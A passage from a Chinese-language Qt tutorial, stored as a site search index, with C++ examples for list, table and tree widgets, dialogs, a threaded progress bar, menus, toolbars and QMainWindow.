","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:16:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"事件信号 //鼠标键盘选中 void currentItemChanged(QListWidgetItem *current, QListWidgetItem *previous); void currentRowChanged(int currentRow); void currentTextChanged(const QString \u0026currentText); //激活, 双击 //可编辑状态下,双击不会触发该信号 void itemActivated(QListWidgetItem *item); //列表内容改变 //通过代码修改或者手动修改列表项显示的文字,会触发该信号 //通过代码新增列表数据,该信号并不会触发 void itemChanged(QListWidgetItem *item); //鼠标左键松开 void itemClicked(QListWidgetItem *item); //鼠标左键或右键双击 void itemDoubleClicked(QListWidgetItem *item); //在设置鼠标跟踪后,鼠标移上去,才会触发该信号 //setMouseTracking(true); void itemEntered(QListWidgetItem *item); //鼠标左键或右键按下 void itemPressed(QListWidgetItem *item); //选择改变 void itemSelectionChanged(); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:16:3","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"示例 #include \u003cQListWidget\u003e#include \u003cQIcon\u003e#include \u003cQLineEdit\u003e luoqt::luoqt(QWidget* parent) : QWidget(parent) { ui.setupUi(this); //清空数据 ui.listWidget-\u003eclear(); //插入数据方式一 QListWidgetItem* item1 = new QListWidgetItem; item1-\u003esetText(\"item1\"); ui.listWidget-\u003eaddItem(item1); //插入数据方式二 new QListWidgetItem(\"item2\", ui.listWidget); //插入数据方式三 ui.listWidget-\u003eaddItem(\"item3\"); //插入包含图标的数据 QListWidgetItem* item4 = new QListWidgetItem; item4-\u003esetText(\"item4\"); item4-\u003esetIcon(QIcon(\":/luoqt/kenan.png\")); ui.listWidget-\u003eaddItem(item4); //插入其他控件, 如LineEdit QListWidgetItem* item5 = new QListWidgetItem(\"12\", ui.listWidget); QLineEdit* edtLine = new QLineEdit(\"item5 LineEdit\"); ui.listWidget-\u003esetItemWidget(item5, edtLine); //设置鼠标跟踪 //ui.listWidget-\u003esetMouseTracking(true); //设置编辑策略, 双击启用编辑状态 ui.listWidget-\u003esetEditTriggers(QAbstractItemView::DoubleClicked); //遍历listWidget中的每个item,设置属性 for (int i = 0; i \u003c ui.listWidget-\u003ecount(); i++) { ui.listWidget-\u003eitem(i)-\u003esetFlags(Qt::ItemIsEditable | Qt::ItemIsSelectable | Qt::ItemIsEnabled); } //设置排序, 升序 ui.listWidget-\u003esortItems(Qt::AscendingOrder); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:16:4","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QTableWidget ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:17:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"属性 //标题显示(上方、左侧) horizontalHeader() verticalHeader() //滚动条显示 setVerticalScrollBarPolicy //选择模式,跟QListWidget一样 selectionMode //选择行、列、一项 //常用的是行选择 setSelectionBehavior //左上角全选按钮 标题上方和左侧都显示的时候,可以看到这个按钮 setCornerButtonEnabled //网格显示 setShowGrid setGridStyle //排序按钮 setSortingEnabled ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:17:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"事件信号 //在设置鼠标跟踪后,鼠标移上去,才会触发该信号,自定义widget不一定有效(Bug) //setMouseTracking(true); void cellEntered(int row, int column); void cellChanged(int row, int column); void cellClicked(int row, int column); void cellDoubleClicked(int row, int column); //仅 QTableWidgetItem 可触发下述信号 //在设置鼠标跟踪后,鼠标移上去,才会触发该信号,自定义widget无效 //setMouseTracking(true); void itemEntered(QTableWidgetItem *item); void itemChanged(QTableWidgetItem *item); void itemClicked(QTableWidgetItem *item); void itemDoubleClicked(QTableWidgetItem *item); //标题栏点击信号 //QTableWidget标题栏的类型为QHeaderView //可在QT手册中查看QHeaderView的信号事件 void sectionClicked(int logicalIndex); //代码进行绑定 QObject::connect(ui.tableWidget-\u003ehorizontalHeader(), SIGNAL(sectionClicked(int)), this, SLOT(SectionClicked(int))); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:17:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"清空内容 #include \u003cQTableWidget\u003e#include \u003cQDebug\u003e#include \u003cQIcon\u003e#include \u003cQLabel\u003e#include \u003cQPixmap\u003e#include \u003cset\u003e#include \u003cQMessageBox\u003e ui.tableWidget-\u003esetColumnCount(0); ui.tableWidget-\u003esetRowCount(0); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:17:3","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"插入标题 class LuoHeader :public QTableWidgetItem { public: LuoHeader::LuoHeader(QString qstr) : QTableWidgetItem(qstr) { } LuoHeader::~LuoHeader() { qDebug() \u003c\u003c this-\u003etext() \u003c\u003c \"removed\"; } }; //插入列标题 ui.tableWidget-\u003esetColumnCount(5); //方式1 ui.tableWidget-\u003esetHorizontalHeaderItem(0, new QTableWidgetItem(\"Col1\")); //方式2 ui.tableWidget-\u003esetHorizontalHeaderItem(1, new QTableWidgetItem); ui.tableWidget-\u003ehorizontalHeaderItem(1)-\u003esetText(\"Col2\"); //方式3 ui.tableWidget-\u003esetHorizontalHeaderItem(2, new LuoHeader(\"C3\")); //在同样的位置插入标题,会清理之前的对象,一会查看控制台,就会发现LuoHeader的析构函数会被调用 ui.tableWidget-\u003esetHorizontalHeaderItem(2, new LuoHeader(\"Col2\")); //设置标题列的宽度 ui.tableWidget-\u003esetColumnWidth(0, 200); //插入行标题 ui.tableWidget-\u003esetRowCount(3); //设置方式跟上面一样, 只不过要将Horizontal换成Vertical //这里展示一种不一样的玩法 QStringList qstrList = { \"Row1\", \"Row2\", \"Row3\" }; ui.tableWidget-\u003esetVerticalHeaderLabels(qstrList); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:17:4","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"插入数据 int nRow = 0; int nCol = 0; //上面设置了 3行5列 //在0行0列、0行1列、0行2列添加内容 ui.tableWidget-\u003esetItem(0, 0, new QTableWidgetItem(\"Item 0, 0\")); ui.tableWidget-\u003esetItem(0, 1, new QTableWidgetItem(\"Item 0, 1\")); ui.tableWidget-\u003esetItem(0, 2, new QTableWidgetItem(\"Item 0, 2\")); //结尾添加一行 nRow = ui.tableWidget-\u003erowCount(); ui.tableWidget-\u003einsertRow(nRow); ui.tableWidget-\u003esetItem(nRow, 0, new QTableWidgetItem(\"ItemEnd\")); //开始添加一行 ui.tableWidget-\u003einsertRow(0); ui.tableWidget-\u003esetItem(0, 0, new QTableWidgetItem(\"ItemBegin\")); //插入QIcon图片 nRow = 0; nCol = 1; ui.tableWidget-\u003esetItem(nRow, nCol, new QTableWidgetItem); ui.tableWidget-\u003eitem(nRow, nCol)-\u003esetIcon(QIcon(\":/luoqt/kenan.png\")); //设置行高 ui.tableWidget-\u003esetRowHeight(nRow, 80); //设置图标显示大小 ui.tableWidget-\u003esetIconSize(QSize(ui.tableWidget-\u003erowHeight(nRow), ui.tableWidget-\u003erowHeight(nRow))); //插入Widget图片 nRow = 2; nCol = 0; QLabel* qLabel = new QLabel; QPixmap qPix(\":/luoqt/kenan.png\"); //缩放到和表格单元的宽高一致 qPix = qPix.scaled(ui.tableWidget-\u003ecolumnWidth(nCol), ui.tableWidget-\u003erowHeight(nRow)); qLabel-\u003esetPixmap(qPix); ui.tableWidget-\u003esetCellWidget(nRow, nCol, qLabel); //插入空数据 ui.tableWidget-\u003einsertRow(0); ui.tableWidget-\u003einsertRow(0); //设置每次选择以行为单位 ui.tableWidget-\u003esetSelectionBehavior(QAbstractItemView::SelectRows); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:17:5","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"获取选中数据 //方式一 //这种方式,无法选择空行 qDebug() \u003c\u003c QStringLiteral(\"方式一--------------------------------\"); QList\u003cQTableWidgetItem*\u003e qTableItems = ui.tableWidget-\u003eselectedItems(); for (int i = 0; i \u003c qTableItems.size(); i++) { qDebug() \u003c\u003c qTableItems[i]-\u003erow() \u003c\u003c \":\" \u003c\u003c qTableItems[i]-\u003ecolumn() \u003c\u003c \" text=\" \u003c\u003c qTableItems[i]-\u003etext(); } //方式2 //这种方式,可以选择空行 qDebug() \u003c\u003c QStringLiteral(\"方式二--------------------------------\"); //选择模式器 QItemSelectionModel* qItemSelModel = ui.tableWidget-\u003eselectionModel(); //获取所有的选择索引 QModelIndexList qModelIndexLst = qItemSelModel-\u003eselectedIndexes(); //获取所有被选中的行号 std::set\u003cint\u003e stdRows; for (int i = 0; i \u003c qModelIndexLst.size(); i++) { //重复的插入会失败 stdRows.insert(qModelIndexLst[i].row()); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:17:6","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"删除数据 //Slot void removeColumn(int column) void removeRow(int row) //给用户提示 QString qstrMsg = QStringLiteral(\"您确认删除:\"); for (std::set\u003cint\u003e::iterator itr = stdRows.begin(); itr != stdRows.end(); itr++) { QTableWidgetItem* item = ui.tableWidget-\u003eitem(*itr, 0); qstrMsg += \"[\"; qstrMsg += QString::number(*itr + 1); qstrMsg += \":\"; if (item) { qstrMsg += item-\u003etext(); } qstrMsg += \"]\"; } int nRet = QMessageBox::information(this, \"\", qstrMsg, QStringLiteral(\"确认\"), QStringLiteral(\"取消\")); //用户点击了确认按钮, nRet == 0 //用户点击了取消按钮, nRet == 1 if (nRet == 0) { //删除多行 while (true) { //获取所有的选择索引 QModelIndexList s = qItemSelModel-\u003eselectedIndexes(); if (s.size() \u003c= 0) { break; } //每次删除一行 ui.tableWidget-\u003eremoveRow(s[0].row()); } } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:17:7","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"源代码 QTableWidget.7z ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:17:8","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QTreeWidget ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:18:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"属性 //标题显示与隐藏 header()-\u003esetVisible(true) //排序 setSortingEnabled //动画 setAnimated //滚动条显示 setVerticalScrollBarPolicy serHorizontalScrollBarPolicy //选择模式,跟QListWidget一样 selectionMode //选择行、列、一项 setSelectionBehavior ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:18:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"常用函数 //QTreeWidget //插入顶部节点 void insertTopLevelItem(int index, QTreeWidgetItem *item); void insertTopLevelItems(int index, const QList\u003cQTreeWidgetItem *\u003e \u0026items); void QTreeWidget::addTopLevelItem(QTreeWidgetItem *item); void QTreeWidget::addTopLevelItems(const QList\u003cQTreeWidgetItem *\u003e \u0026items); //获取顶部节点 QTreeWidgetItem *QTreeWidget::topLevelItem(int index) const; //获取顶部节点数量 int topLevelItemCount() const; //插入Widget控件 void QTreeWidget::setItemWidget(QTreeWidgetItem *item, int column, QWidget *widget); //获取选中节点 QList\u003cQTreeWidgetItem *\u003e QTreeWidget::selectedItems() const; //设置列数量 void setColumnCount(int columns); //QTreeWidgetItem //插入子节点 void addChild(QTreeWidgetItem *child); void addChildren(const QList\u003cQTreeWidgetItem *\u003e \u0026children); //设置文本 void setText(int column, const QString \u0026text); //获取父节点 QTreeWidgetItem* QTreeWidgetItem::parent() const; //获取treeWidget QTreeWidget* treeWidget() const; ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:18:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"槽函数 void clear(); //收缩 void collapseItem(const QTreeWidgetItem *item); //展开 void expandItem(const QTreeWidgetItem *item); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:18:3","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"事件信号 void currentItemChanged(QTreeWidgetItem *current, QTreeWidgetItem *previous); void itemActivated(QTreeWidgetItem *item, int column); void itemChanged(QTreeWidgetItem *item, int column); void itemClicked(QTreeWidgetItem *item, int column); void itemCollapsed(QTreeWidgetItem *item); void itemDoubleClicked(QTreeWidgetItem *item, int column); void itemEntered(QTreeWidgetItem *item, int column); void itemExpanded(QTreeWidgetItem *item); void itemPressed(QTreeWidgetItem *item, int column); void itemSelectionChanged(); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:18:4","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"清空内容 #include \u003cQTreeWidget\u003e#include \u003cQPushButton\u003e //清理标题,不清理数据 //ui.treeWidget-\u003esetColumnCount(0);//设置为0,不会清理 ui.treeWidget-\u003esetHeaderItem(new QTreeWidgetItem); //清空数据 ui.treeWidget-\u003eclear(); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:18:5","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"插入标题 //设置4列 QTreeWidgetItem* pTreeHeader = ui.treeWidget-\u003eheaderItem(); pTreeHeader-\u003esetText(0, \"head1\"); pTreeHeader-\u003esetText(1, \"head2\"); pTreeHeader-\u003esetText(2, \"head3\"); pTreeHeader-\u003esetText(3, \"head4\"); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:18:6","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"插入数据 //顶部节点插入 //在结尾处插入 //方式一 ui.treeWidget-\u003eaddTopLevelItem(new QTreeWidgetItem()); ui.treeWidget-\u003etopLevelItem(0)-\u003esetText(0, \"tree node1\"); ui.treeWidget-\u003etopLevelItem(0)-\u003esetText(1, \"tree node2\"); //方式二 ui.treeWidget-\u003eaddTopLevelItem(new QTreeWidgetItem({\"tree node11\", \"tree node22\"})); //在指定位置插入 ui.treeWidget-\u003einsertTopLevelItem(0, new QTreeWidgetItem({ \"tree node1-1\", \"tree node2-2\" })); //在结尾插入 ui.treeWidget-\u003einsertTopLevelItem(ui.treeWidget-\u003etopLevelItemCount(), new QTreeWidgetItem({ \"tree node End\" })); //子节点插入 //方式一 ui.treeWidget-\u003etopLevelItem(0)-\u003eaddChild(new QTreeWidgetItem({ \"child1\" ,\"child2\", \"child3\" })); / ui.treeWidget-\u003etopLevelItem(1)-\u003eaddChild(new QTreeWidgetItem({ \"child11\" })); //方式二 QTreeWidgetItem* pTreeItem = ui.treeWidget-\u003etopLevelItem(1); ui.treeWidget-\u003eaddTopLevelItem(new QTreeWidgetItem(pTreeItem, { \"child110012\" })); //插入图标 ui.treeWidget-\u003esetIconSize(QSize(60, 60)); ui.treeWidget-\u003etopLevelItem(0)-\u003esetIcon(0, QIcon(\":/luoqt/ke nan.png\")); //插入Widget控件 QPushButton* btn = new QPushButton(\"test\"); ui.treeWidget-\u003esetItemWidget(ui.treeWidget-\u003etopLevelItem(1), 0, btn); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:18:7","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QDialog ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:19:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"常用函数 //拿Dialog的返回值,与exec的返回值一样 int QDialog::result() const; ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:19:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"槽函数 //默认显示的是非模态对话框. //可在show前调用setModal(true),或者setWindowModality(Qt::ApplicationModal),将其设置为模态对话框. void QWidget::show(); //阻塞,有返回值, 显示的是模态对话框. virtual int exec(); //可将一个按钮的点击信号与下述槽函数绑定 //exec的返回值为 QDialog::Accepted virtual void accept(); //exec的返回值为 QDialog::Rejected virtual void reject(); //可在与按钮点击信号绑定的槽函数中调用,这样就可以自定义exec的返回值为 r virtual void done(int r); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:19:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"自定义MessageBox 新建一个Qt类继承QDialog 自定义界面 可以弄一个QLabel控件用来显示要提示的信息, 将确认按钮与QDialog的槽函数accept绑定, 将取消按钮与QDialog的槽函数reject绑定. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:19:3","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QProgressBar应用 新建一个线程类,模拟做事 LuoThread.h #include \u003cQThread\u003e class LuoThread : public QThread { Q_OBJECT public: LuoThread(); ~LuoThread(); protected: void run(); signals: ///0~1000 void SetPos(int pos); }; LuoThread.cpp #include \"luothread.h\" LuoThread::LuoThread() { } LuoThread::~LuoThread() { } void LuoThread::run() { //模拟做事 //这个地方需要设置QProgressBar的范围为0-1000 for (int i = 0; i \u003c= 1000; i++) { SetPos(i); msleep(5); } } 新建一个对话框类,显示进度 LuoProgressDialog.h #include \u003cQDialog\u003e#include \u003cQThread\u003e#include \"ui_LuoProgressDialog.h\" class LuoProgressDialog : public QDialog { Q_OBJECT public: LuoProgressDialog(QWidget *parent = Q_NULLPTR); ~LuoProgressDialog(); public slots: //0~1000 void SetPos(int pos); private: Ui::LuoProgressDialog ui; }; LuoProgressDialog.cpp #include \"LuoProgressDialog.h\" LuoProgressDialog::LuoProgressDialog(QWidget *parent) : QDialog(parent) { ui.setupUi(this); //为了实现圆角效果,在QDialog上面放一个QWidget控件 //在QWidget控件上面放一个QProgressBar控件 //去掉标题栏 this-\u003esetWindowFlags(Qt::FramelessWindowHint); //设置背景透明 this-\u003esetAttribute(Qt::WA_TranslucentBackground, true); } LuoProgressDialog::~LuoProgressDialog() { } void LuoProgressDialog::SetPos(int pos) { ui.progressBar-\u003esetValue(pos); if (pos == 1000) { for (int i = 100; i \u003e 0; i--) { //透明度 1.0 0.0 this-\u003esetWindowOpacity((float)i / 100.0); QThread::msleep(10); //界面上有一个QLabel控件 //这个地方的setText只是发出信号,需要等待槽函数进行处理 //LuoProgressDialog::SetPos(int pos)这个槽函数不退出,setText的槽函数是不会处理的 ui.label-\u003esetText(QString::number(i)); //这一步会将消息队列中的消息都处理下,会立即调用槽函数 QEventLoop loop; loop.processEvents(); } this-\u003eclose(); } } 为了实现圆角效果,需要设置QWidget的样式为: #widget{ background-color: qlineargradient(spread:reflect, x1:0.999896, y1:0.494136, x2:1, y2:1, stop:0 rgba(0, 0, 0, 255), stop:1 rgba(255, 255, 255, 255)); border:1px groove rgb(232, 232, 232); border-radius:20; } Main中调用 #include \"luothread.h\"#include \"LuoProgressDialog.h\" int main(int argc, char *argv[]) { QApplication a(argc, argv); //进度条 LuoProgressDialog luoPro; //线程 LuoThread luoThread; //信号槽绑定 QObject::connect(\u0026luoThread, SIGNAL(SetPos(int)), \u0026luoPro, SLOT(SetPos(int))); //启动线程 luoThread.start(); //显示对话框 luoPro.exec(); return a.exec(); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:19:4","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"源代码 QDialog.7z ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:19:5","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Qt菜单 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:20:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Widget创建菜单 添加菜单 LuoWidget::LuoWidget(QWidget *parent) : QWidget(parent) { ui.setupUi(this); //插入菜单栏 QMenuBar* m = new QMenuBar(this); //设置菜单栏大小 m-\u003eresize(width(), m-\u003eheight()); //一级菜单 QMenu* m1 = m-\u003eaddMenu(QStringLiteral(\"菜单1\")); //二级菜单 QAction* a1 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.1\")); QAction* a2 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.2\")); QAction* a3 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.3\")); //设置图标 a3-\u003esetIcon(QIcon(\":/LuoMenu/ke nan.png\")); //三级菜单 QMenu* m14 = m1-\u003eaddMenu(QStringLiteral(\"二级菜单1.4\")); m14-\u003eaddAction(QStringLiteral(\"三级菜单1.4.1\")); //设置图标 m14-\u003esetIcon(QIcon(\":/LuoMenu/ke nan.png\")); //一级菜单 QMenu* m2 = m-\u003eaddMenu(QStringLiteral(\"菜单2\")); QMenu* m3 = m-\u003eaddMenu(QStringLiteral(\"菜单3\")); } 事件信号 //QMenuBar void hovered(QAction *action); void triggered(QAction *action); //QMenu void hovered(QAction *action); void triggered(QAction *action); //QAction void changed(); void hovered(); void toggled(bool checked); void triggered(bool checked = false); //槽函数 public slots: void Hover() { qDebug() \u003c\u003c \"Hover\"; } void Action1() { qDebug() \u003c\u003c \"Action1\"; } void Action(QAction* act) { qDebug() \u003c\u003c \"Action \" \u003c\u003c act-\u003etext(); } //进行绑定 //一级菜单 m1 = m-\u003eaddMenu(QStringLiteral(\"菜单1\")); //QMenu所有子节点(子节点的子节点)点击后,都会触发该信号 connect(m1, SIGNAL(triggered(QAction*)), this, SLOT(Action(QAction*))); //二级菜单 QAction* a1 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.1\")); //QAction 触发信号 connect(a1, SIGNAL(triggered()), this, SLOT(Action1())); QAction* a2 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.2\")); //QAction 鼠标悬停信号 connect(a2, SIGNAL(hovered()), this, SLOT(Hover())); 动态产生菜单 //槽函数 void Hovered(QAction* act) { //动态菜单 if (act-\u003etext() == QStringLiteral(\"菜单3\")) { act-\u003emenu()-\u003eclear(); act-\u003emenu()-\u003eaddAction(QStringLiteral(\"菜单3.1\")); act-\u003emenu()-\u003eaddAction(QStringLiteral(\"菜单3.2\")); act-\u003emenu()-\u003eaddAction(QStringLiteral(\"菜单3.3\")); } } //信号槽绑定 //插入菜单栏 QMenuBar* m = new QMenuBar(this); //悬停,动态菜单生成 connect(m, SIGNAL(hovered(QAction*)), this, SLOT(Hovered(QAction*))); 菜单单选和多选 //槽函数 void Action1(bool b) { qDebug() \u003c\u003c \"Action1 \" \u003c\u003c b; } //二级菜单 QAction* a1 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.1\")); QAction* a2 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.2\")); QAction* a3 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.3\")); //设置可选 a1-\u003esetCheckable(true); a2-\u003esetCheckable(true); a3-\u003esetCheckable(true); //添加到组 QActionGroup* ag = new QActionGroup(this); ag-\u003eaddAction(a2); ag-\u003eaddAction(a3); //单选 ag-\u003esetExclusive(true); //是否选中 connect(a1, SIGNAL(triggered(bool)), this, SLOT(Action1(bool))); //添加快捷键 a1-\u003esetShortcut(QString(\"A\")); 按钮菜单 //准备一个按钮,响应点击事件 //按钮点击事件 void Click() { //鼠标位置显示菜单 //m1的类型是QMenu m1-\u003eexec(QCursor::pos()); } QMenuBar* m = new QMenuBar(this); //设置菜单栏大小 m-\u003eresize(width(), m-\u003eheight()); //一级菜单 m1 = m-\u003eaddMenu(QStringLiteral(\"菜单1\")); //二级菜单 QAction* a1 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.1\")); QAction* a2 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.2\")); QAction* a3 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.3\")); //三级菜单 QMenu* m14 = m1-\u003eaddMenu(QStringLiteral(\"二级菜单1.4\")); m14-\u003eaddAction(QStringLiteral(\"三级菜单1.4.1\")); 点击按钮的时候,就会弹出菜单. 工具栏 #include \u003cQToolBar\u003e QToolBar* tBar = new QToolBar(this); tBar-\u003esetGeometry(0, m-\u003eheight(), width(), 30); tBar-\u003esetIconSize(QSize(30, 30)); tBar-\u003eaddAction(a1); 状态栏 #include \u003cQStatusBar\u003e QStatusBar* sBar = new QStatusBar(this); sBar-\u003esetGeometry(0, height() - 30, width(), 30); sBar-\u003eshowMessage(QStringLiteral(\"测试消息3秒消失!\"), 3000); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:20:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QMainWindow QMainWindow继承QWidget,封装了很多操作. QMainWindow │ ├─QMenuBar ├ └─QMenu ├ └─QAction ├─QToolBar └─QStatusBar 菜单栏 //一级菜单 QMenu* m1 = this-\u003emenuBar()-\u003eaddMenu(QStringLiteral(\"菜单1\")); //二级菜单 QAction* a11 = m1-\u003eaddAction(QStringLiteral(\"菜单1.1\")); QAction* a12 = m1-\u003eaddAction(QStringLiteral(\"菜单1.2\")); QAction* a13 = m1-\u003eaddAction(QStringLiteral(\"菜单1.3\")); //添加图标 a12-\u003esetIcon(QIcon(\":/LuoMenu/ke nan.png\")); //一级菜单 QMenu* m2 = this-\u003emenuBar()-\u003eaddMenu(QStringLiteral(\"菜单2\")); QMenu* m3 = this-\u003emenuBar()-\u003eaddMenu(QStringLiteral(\"菜单3\")); 工具栏 ui.mainToolBar-\u003eaddAction(a11); ui.mainToolBar-\u003eaddAction(a12); ui.mainToolBar-\u003eaddAction(a13); //设置ToolBar样式, 文件名显示在图标下面 ui.mainToolBar-\u003esetToolButtonStyle(Qt::ToolButtonTextUnderIcon); //工具栏换行 this-\u003eaddToolBarBreak(); //默认顶部插入工具栏 //可调用下面的重载函数,调整插入位置 //void addToolBar(Qt::ToolBarArea area, QToolBar * toolbar) QToolBar* tBar2 = this-\u003eaddToolBar(\"toolBar2\"); tBar2-\u003eaddAction(QStringLiteral(\"顶部\")); 状态栏 this-\u003estatusBar()-\u003eshowMessage(\"Status Bar\"); 